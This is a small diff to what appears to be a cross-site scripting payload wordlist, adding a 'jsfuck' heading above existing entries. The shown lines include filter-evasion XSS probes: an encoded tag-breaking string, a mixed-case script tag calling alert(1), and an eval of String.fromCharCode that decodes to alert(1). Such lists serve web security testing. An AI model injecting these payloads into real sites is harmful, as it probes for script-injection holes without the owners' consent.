@@ -6,6 +6,8 @@
 '"%26%23062;%26%23060;h1%26%23062;test%26%23060;/H1%26%23062;
 '"><sCrIpt>alert(1)</scRipT>
 
+# jsfuck
+
 //  alert(1)
 eval(String.fromCharCode(97,108,101,114,116,40,49,41))
 
